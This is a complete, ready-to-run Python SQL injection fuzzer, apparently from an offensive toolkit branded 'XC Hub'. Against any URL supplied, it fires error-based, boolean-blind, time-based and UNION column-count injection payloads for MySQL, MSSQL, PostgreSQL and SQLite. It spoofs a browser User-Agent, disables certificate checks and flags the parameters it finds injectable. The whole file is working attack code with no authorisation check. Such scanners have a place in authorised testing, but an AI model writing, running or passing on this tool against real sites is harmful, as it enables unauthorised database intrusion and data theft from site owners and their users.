#!/usr/bin/env python3
"""XC SQLi — SQL Injection Parameter Fuzzer"""

import sys, ssl, re, time, argparse
from urllib.request import urlopen, Request
from urllib.error import HTTPError
from urllib.parse import urlparse, urlencode, parse_qs, urljoin

R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'; M='\033[95m'; C='\033[96m'; W='\033[97m'; DIM='\033[2m'; BOLD='\033[1m'; RST='\033[0m'

BANNER = f"""{R}
╔═╗╔═╗╦  ╦
╚═╗║═╬╝║  ║
╚═╝╚═╝ ╩═╝╩{RST}
{DIM}SQL Injection Fuzzer — XC Hub{RST}
"""

ERROR_PATTERNS = [
    r"SQL syntax.*?MySQL",
    r"Warning.*?\Wmysqli?_",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your MySQL server",
    r"MySqlException",
    r"ORA-\d{5}",
    r"Oracle.*?Driver",
    r"Warning.*?\Woci_",
    r"Warning.*?\Wora_",
    r"Microsoft OLE DB Provider for SQL Server",
    r"Unclosed quotation mark after the character string",
    r"quoted string not properly terminated",
    r"\[Microsoft\]\[ODBC SQL Server Driver\]",
    r"mssql_query\(\)",
    r"SQLServer JDBC Driver",
    r"SqlException",
    r"SQLSTATE\[",
    r"Syntax error or access violation",
    r"PostgreSQL.*?ERROR",
    r"Warning.*?\Wpg_",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"PG::SyntaxError:",
    r"SQLite/JDBCDriver",
    r"SQLiteException",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*?\Wsqlite_",
    r"sqlite_array_query",
    r"SQLITE_ERROR",
    r"unrecognized token:",
    r"DB2 SQL error",
    r"Sybase message",
    r"Sybase.*?Server message",
    r"SybSQLException",
    r"com\.sybase\.jdbc",
    r"Ingres SQLSTATE",
    r"com\.informix\.jdbc",
    r"Dynamic SQL Error",
    r"Warning.*?ibase_",
    r"org\.hibernate\.exception",
    r"com\.mysql\.jdbc\.exceptions",
    r"Zend_Db_(Adapter|Statement)_Exception",
    r"Pdo[.\s?]*(Mysql|Sqlite|Pgsql|Mssql)",
    r"CDbCommand failed to execute the SQL statement",
    r"ADODB[_\.]",
    r"DBD::mysql::st execute failed",
    r"not a valid MySQL result",
    r"An illegal character has been found in the statement",
]

BOOLEAN_PAYLOADS = [
    ("true condition",  "' OR '1'='1"),
    ("false condition", "' OR '1'='2"),
    ("comment bypass",  "' OR 1=1--"),
    ("MSSQL comment",   "' OR 1=1--+"),
    ("hash comment",    "' OR 1=1#"),
    ("double quote",    '" OR "1"="1'),
    ("int inject",      " OR 1=1"),
    ("int false",       " OR 1=2"),
]

ERROR_PAYLOADS = [
    "'",
    "''",
    "\\",
    "1' AND 1=CONVERT(int,(SELECT CHAR(65)))--",
    "1 AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1; SELECT SLEEP(0)--",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
]

TIME_PAYLOADS = [
    ("MySQL SLEEP",     "1' AND SLEEP(3)--",              3),
    ("MySQL SLEEP 2",   "1' OR SLEEP(3)--",               3),
    ("MSSQL WAITFOR",   "1'; WAITFOR DELAY '0:0:3'--",   3),
    ("MSSQL WAITFOR 2", "1' WAITFOR DELAY '0:0:3'--",    3),
    ("PostgreSQL pg_sleep","1' AND 1=(SELECT 1 FROM PG_SLEEP(3))--", 3),
    ("SQLite like",     "1' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", 3),
]

UNION_COLUMNS = range(1, 11)

def fetch(url, timeout=12):
    h = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': '*/*',
        'Cookie': '',
    }
    req = Request(url, headers=h)
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t_start = time.time()
        with urlopen(req, timeout=timeout, context=ctx) as r:
            body = r.read(512*1024).decode('utf-8', errors='ignore')
            elapsed = time.time() - t_start
            return r.status, body, elapsed
    except HTTPError as e:
        try: body = e.read(8192).decode('utf-8', errors='ignore')
        except: body = ''
        return e.code, body, 0
    except Exception as e:
        return None, str(e), 0

def inject_param(base_url, param, payload):
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

def check_error(body):
    for pattern in ERROR_PATTERNS:
        if re.search(pattern, body, re.IGNORECASE):
            match = re.search(pattern, body, re.IGNORECASE)
            return match.group(0)[:100]
    return None

def error_based_test(base_url, params):
    print(f"\n{BOLD}{B}━━━ ERROR-BASED SQLi ━━━{RST}")
    findings = []
    for param in params:
        print(f"\n  {C}Param: {W}{param}{RST}")
        for payload in ERROR_PAYLOADS:
            url = inject_param(base_url, param, payload)
            status, body, elapsed = fetch(url)
            if status is None:
                continue
            err = check_error(body)
            if err:
                print(f"  {R}[VULN]{RST} payload={C}{payload}{RST}")
                print(f"         err_sig={Y}{err}{RST}")
                findings.append({'param': param, 'type': 'error-based', 'payload': payload})
            time.sleep(0.15)
    return findings

def boolean_blind_test(base_url, params):
    print(f"\n{BOLD}{B}━━━ BOOLEAN BLIND SQLi ━━━{RST}")
    findings = []
    for param in params:
        print(f"\n  {C}Param: {W}{param}{RST}")
        _, baseline_body, _ = fetch(inject_param(base_url, param, '1'))
        baseline_len = len(baseline_body)
        for label, payload in BOOLEAN_PAYLOADS:
            url = inject_param(base_url, param, payload)
            status, body, elapsed = fetch(url)
            diff = abs(len(body) - baseline_len) if body else 0
            if diff > 50:
                print(f"  {Y}[?]{RST} {label} — response diff: {W}{diff} bytes{RST}")
                print(f"       payload={C}{payload}{RST}")
                if diff > 200:
                    findings.append({'param': param, 'type': 'boolean-blind', 'payload': payload})
            time.sleep(0.1)
    return findings

def time_based_test(base_url, params):
    print(f"\n{BOLD}{B}━━━ TIME-BASED BLIND SQLi ━━━{RST}")
    findings = []
    _, _, baseline_time = fetch(inject_param(base_url, params[0] if params else 'id', '1'))
    for param in params:
        print(f"\n  {C}Param: {W}{param}{RST}")
        for label, payload, expected_delay in TIME_PAYLOADS:
            url = inject_param(base_url, param, payload)
            status, body, elapsed = fetch(url, timeout=expected_delay + 6)
            delayed = elapsed >= (expected_delay * 0.8)
            if delayed and elapsed > (baseline_time + expected_delay * 0.5):
                print(f"  {R}[VULN]{RST} {label} — elapsed {W}{elapsed:.2f}s{RST}")
                print(f"         payload={C}{payload}{RST}")
                findings.append({'param': param, 'type': 'time-based', 'payload': payload, 'elapsed': elapsed})
            else:
                print(f"  {DIM}[~] {label} — {elapsed:.2f}s{RST}")
            time.sleep(0.5)
    return findings

def union_cols_test(base_url, param):
    print(f"\n{BOLD}{B}━━━ UNION COLUMN COUNT ━━━{RST}")
    for n in UNION_COLUMNS:
        nulls = ','.join(['NULL'] * n)
        payload = f"' UNION SELECT {nulls}--"
        url = inject_param(base_url, param, payload)
        status, body, elapsed = fetch(url)
        err = check_error(body)
        if not err and status == 200:
            print(f"  {G}[!]{RST} {n} columns might work — no error on UNION SELECT {nulls}")
            return n
        time.sleep(0.1)
    print(f"  {DIM}Column count unclear from this test{RST}")
    return None

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description='XC SQLi Fuzzer')
    parser.add_argument('target', help='Target URL with params (e.g. https://site.com/page?id=1)')
    parser.add_argument('--params', help='Comma-separated params to test (default: all from URL)')
    parser.add_argument('--time', action='store_true', help='Time-based blind test (slow)')
    parser.add_argument('--union', help='Test UNION column count for this param')
    parser.add_argument('--full', action='store_true', help='All techniques')
    args = parser.parse_args()

    target = args.target
    if not target.startswith('http'):
        target = 'https://' + target
    parsed = urlparse(target)
    url_params = list(parse_qs(parsed.query).keys())

    if args.params:
        test_params = [p.strip() for p in args.params.split(',')]
    elif url_params:
        test_params = url_params
    else:
        test_params = ['id', 'q', 'search', 'page', 'cat', 'user', 'item']

    print(f"{BOLD}Target:{RST} {W}{target}{RST}")
    print(f"{BOLD}Params:{RST} {W}{', '.join(test_params)}{RST}")

    all_findings = []
    all_findings += error_based_test(target, test_params)
    all_findings += boolean_blind_test(target, test_params)

    if args.time or args.full:
        all_findings += time_based_test(target, test_params)

    if args.union:
        union_cols_test(target, args.union)
    elif args.full and test_params:
        union_cols_test(target, test_params[0])

    print(f"\n{BOLD}━━━ SUMMARY ━━━{RST}")
    if all_findings:
        print(f"  {R}Total findings: {len(all_findings)}{RST}")
        for f in all_findings:
            tag = R if f['type'] in ('error-based', 'time-based') else Y
            print(f"  {tag}[{f['type']}]{RST} param={W}{f['param']}{RST} payload={C}{f['payload']}{RST}")
    else:
        print(f"  {G}No SQLi found (try --time --full for deeper scan){RST}")

    print(f"\n{DIM}Use --time for time-based, --union PARAM for column enumeration, --full for everything.{RST}\n")

if __name__ == '__main__':
    main()
